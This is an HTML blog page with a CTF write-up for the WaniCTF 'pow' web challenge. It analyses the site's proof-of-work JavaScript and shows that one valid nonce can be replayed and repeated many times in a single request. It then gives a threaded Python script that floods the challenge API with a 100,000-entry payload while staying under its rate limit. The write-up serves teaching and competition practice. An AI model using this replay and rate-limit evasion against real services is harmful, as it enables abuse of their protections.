@@ -1,0 +1,113 @@
+<!DOCTYPE html>
+<html>
+    <head>
+        <link href="https://cdn.jsdelivr.net/npm/jetbrains-mono@1.0.6/css/jetbrains-mono.min.css" rel="stylesheet">
+<title>aan0303</title>
+<meta charset="UTF-8">
+<meta name="description" content="whoami">
+<meta name="keywords" content="aan0303, megat, ilikeronnnnii">
+<meta name="author" content="Megat Zafran">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta name="theme-color" content="#000000" media="(prefers-color-scheme: dark)">
+<meta name="theme-color" content="#ffffff" media="(prefers-color-scheme: light)">
+<meta name="description" content="webpowcredits to my sifu @vicevirus  difficulty - easypoints - 143solves - 243  analysisfirst of all when you visit the website there is a client-side scripting consist of 3 function, hash, send and m">
+<meta property="og:type" content="article">
+<meta property="og:title" content="WaniCTF Writeups">
+<meta property="og:url" content="http://example.com/2024/06/24/wanictf/index.html">
+<meta property="og:site_name" content="aan0303">
+<meta property="og:description" content="webpowcredits to my sifu @vicevirus  difficulty - easypoints - 143solves - 243  analysisfirst of all when you visit the website there is a client-side scripting consist of 3 function, hash, send and m">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://example.com/images/image123.png">
+<meta property="og:image" content="http://example.com/images/image1234.png">
+<meta property="article:published_time" content="2024-06-24T02:00:23.000Z">
+<meta property="article:modified_time" content="2024-06-23T12:21:12.014Z">
+<meta property="article:author" content="Megat Zafran">
+<meta property="article:tag" content="writeups">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/images/image123.png">
+<link rel="shortcut icon" href="/images/avatar.png">
+
+<link rel="stylesheet" href="/css/common.css">
+
+
+
+
+
+
+  
+<link rel="stylesheet" href="/css/post.css">
+
+  <link rel="stylesheet" href="/css/highlight-dark.css" media="screen and (prefers-color-scheme: dark)">
+  <link rel="stylesheet" href="/css/highlight-light.css" media="screen and (prefers-color-scheme: light)">
+  <script src="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.8.0/build/highlight.min.js"></script>
+  <script>hljs.highlightAll();</script>
+  <script type="text/javascript"
+    src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.1/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
+  </script>
+  <script type="text/x-mathjax-config">
+    MathJax.Hub.Config({
+      tex2jax: {inlineMath: [['$','$'], ['\\(','\\)']]}
+    });
+  </script>
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.css">
+  <script src="https://cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js"></script>
+
+    <meta name="generator" content="Hexo 7.2.0"></head>
+    <body>
+        <div class="post">
+    <header class="breadcrumb">
+        <a href="/" style="text-decoration: underline; font-style: italic;">Home</a>
+        <span> / </span>
+        <a style="text-decoration: underline; font-style: italic;" href="/2024/06/24/wanictf/">WaniCTF Writeups</a>
+    </header>
+    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#web"><span class="toc-text">web</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#pow"><span class="toc-text">pow</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#analysis"><span class="toc-text">analysis</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#hash-function"><span class="toc-text">hash function</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#main-function"><span class="toc-text">main function</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#send-function"><span class="toc-text">send function</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#exploit"><span class="toc-text">exploit</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#payload"><span class="toc-text">payload</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#flag"><span class="toc-text">flag</span></a></li></ol></li></ol>
+    <div class="post-body">
+        <h1 class="post-title">WaniCTF Writeups</h1>
+        <div class="post-meta">
+            2024-5-24
+            <span> · </span>
+            
+                <a href="/tags/writeups">#writeups</a>
+            
+        </div>
+        <div class="post-content"><h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="pow"><a href="#pow" class="headerlink" title="pow"></a>pow</h2><p>credits to my sifu <strong>@vicevirus</strong></p>
+<blockquote>
+<p>difficulty - easy<br>points - 143<br>solves - 243</p>
+</blockquote>
+<h2 id="analysis"><a href="#analysis" class="headerlink" title="analysis"></a>analysis</h2><p>first of all when you visit the website there is a client-side scripting consist of 3 function, hash, send and main.</p>
+<h3 id="hash-function"><a href="#hash-function" class="headerlink" title="hash function"></a>hash function</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">function hash(input) &#123;</span><br><span class="line">  let result = input;</span><br><span class="line">  for (let i = 0; i &lt; 10; i++) &#123;</span><br><span class="line">    result = CryptoJS.SHA256(result);</span><br><span class="line">  &#125;</span><br><span class="line">  return (result.words[0] &amp; 0xFFFFFF00) === 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>this function takes an input, and hashes it 10 times. the function returns <strong>true</strong> only if the first 24 bits of the first word of the resulting hash are all zeros using this condition <code>(result.words[0] &amp; 0xFFFFFF00) === 0</code>.</p>
+<h3 id="main-function"><a href="#main-function" class="headerlink" title="main function"></a>main function</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">async function main() &#123;</span><br><span class="line">        await send([]);</span><br><span class="line">        async function loop() &#123;</span><br><span class="line">          document.getElementById(</span><br><span class="line">            &quot;client-status&quot;</span><br><span class="line">          ).innerText = `Checking $&#123;i.toString()&#125;...`;</span><br><span class="line">          localStorage.setItem(&quot;pow_progress&quot;, i.toString());</span><br><span class="line">          for (let j = 0; j &lt; 1000; j++) &#123;</span><br><span class="line">            i++;</span><br><span class="line">            if (hash(i.toString())) &#123; &lt;--------------------------------</span><br><span class="line">              await send([i.toString()]);</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line">          requestAnimationFrame(loop);</span><br><span class="line">        &#125;</span><br><span class="line">        loop();</span><br><span class="line">      &#125;</span><br><span class="line">      main();</span><br></pre></td></tr></table></figure>
+
+<p>it basically iterates the value of i, updates it to the client-status element “Checking {i}…”</p>
+<p>increments it 1000 times, and every increment will be passed into hash function, if the hash value meets the condition <code>(result.words[0] &amp; 0xFFFFFF00) === 0</code>. it sends the value to the server using send function.</p>
+<h3 id="send-function"><a href="#send-function" class="headerlink" title="send function"></a>send function</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">async function send(array) &#123;</span><br><span class="line">   document.getElementById(&quot;server-response&quot;).innerText = await fetch(</span><br><span class="line">     &quot;/api/pow&quot;,</span><br><span class="line">     &#123;</span><br><span class="line">       method: &quot;POST&quot;,</span><br><span class="line">       headers: &#123;</span><br><span class="line">         &quot;Content-Type&quot;: &quot;application/json&quot;,</span><br><span class="line">       &#125;,</span><br><span class="line">       body: JSON.stringify(array),</span><br><span class="line">     &#125;</span><br><span class="line">   ).then((r) =&gt; r.text());</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>
+
+<p>since i’m not a fan of crypto myself and have 0 clue what value meets the <code>(result.words[0] &amp; 0xFFFFFF00) === 0</code> condition, i just wait for it to increment the progress from 0 to 1 and take a look at its values using burp suite.</p>
+<img src="/images/image123.png" style="width:75%;vertical-align:middle;">
+
+
+<p>as you can see the value of <code>[&quot;2862152&quot;]</code> increase the progress by 1.</p>
+<h2 id="exploit"><a href="#exploit" class="headerlink" title="exploit"></a>exploit</h2><p>now that we managed to get a value that will increase the progress i’ve tried to send the same post request to the server again using the same payload.</p>
+<img src="/images/image1234.png" style="width:75%;vertical-align:middle;">
+
+
+<p>voila the progress increases, therefore the only steps to do here is just make a script that will send the post request with the same value over and over again using curl 1000000 times that would solve the challenge no? nope. i was wrong there is a rate limit when you try to send the 19th request, it gets blocked.</p>
+<p>so, i’ve contacted <strong>@vicevirus</strong> and he found an exploit where you can multiply the progress value by sending more than one valid data in an array, like this </p>
+<p><code>&#39;[&quot;2862152&quot;, &quot;29671041&quot;]&#39;</code> &lt;– increases the progress 2 times per post request</p>
+<p>but still, finding other valid values that fullfill the condition takes quite a long time, therefore this approach is not feasible</p>
+<p>then he found out that you can just use the same values in the array, it doesn’t need to be unique, like this</p>
+<p><code>&#39;[&quot;2862152&quot;, &quot;2862152&quot;, &quot;2862152&quot;, &quot;2862152&quot;, &quot;2862152&quot;]&#39;</code> &lt;– still valid increases the progress 5 times per post request</p>
+<h2 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h2><p>lastly just multiply it 100000 times and create a script that will send it repeatedly</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload_list = [&quot;29671041&quot;] * 100000 # increases progress by 100000 times per post request</span><br><span class="line">payload = str(payload_list).replace(&quot;&#x27;&quot;, &#x27;&quot;&#x27;)</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">import time</span><br><span class="line">import requests</span><br><span class="line">import threading</span><br><span class="line"></span><br><span class="line">url = &quot;https://web-pow-lz56g6.wanictf.org/api/pow&quot;</span><br><span class="line">headers = &#123;</span><br><span class="line">    &quot;Cookie&quot;: &quot;pow_session=&#123;your cookie&#125;&quot;, # insert your cookie</span><br><span class="line">    &quot;Content-Length&quot;: &quot;14&quot;,</span><br><span class="line">    &quot;Content-Type&quot;: &quot;application/json&quot;,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">payload_list = [&quot;29671041&quot;] * 100000 # increases progress by 100000 times per post request</span><br><span class="line">payload = str(payload_list).replace(&quot;&#x27;&quot;, &#x27;&quot;&#x27;)</span><br><span class="line"></span><br><span class="line">def send_request():</span><br><span class="line">    response = requests.post(url, headers=headers, data=payload)</span><br><span class="line">    if response.status_code == 429:  # Rate limit status code</span><br><span class="line">        retry_after = int(response.headers.get(&quot;Retry-After&quot;, 1))</span><br><span class="line">        print(f&quot;Rate limited. Retrying after &#123;retry_after&#125; seconds.&quot;)</span><br><span class="line">        time.sleep(retry_after)</span><br><span class="line">    else:</span><br><span class="line">        print(response.text)</span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">    for _ in range(100):</span><br><span class="line">        threads = []</span><br><span class="line">        # Create 18 threads</span><br><span class="line">        for _ in range(18):</span><br><span class="line">            thread = threading.Thread(target=send_request)</span><br><span class="line">            threads.append(thread)</span><br><span class="line">            thread.start()</span><br><span class="line">        </span><br><span class="line">        for thread in threads:</span><br><span class="line">            thread.join()</span><br><span class="line">        </span><br><span class="line">        time.sleep(10)</span><br><span class="line"></span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
+
+<h2 id="flag"><a href="#flag" class="headerlink" title="flag"></a>flag</h2><p><code>FLAG&#123;N0nCE_reusE_i$_FUn&#125;</code></p>
+</div>
+        <div class="divider"></div>
+    </div>
+</div>
+    </body>
+</html>
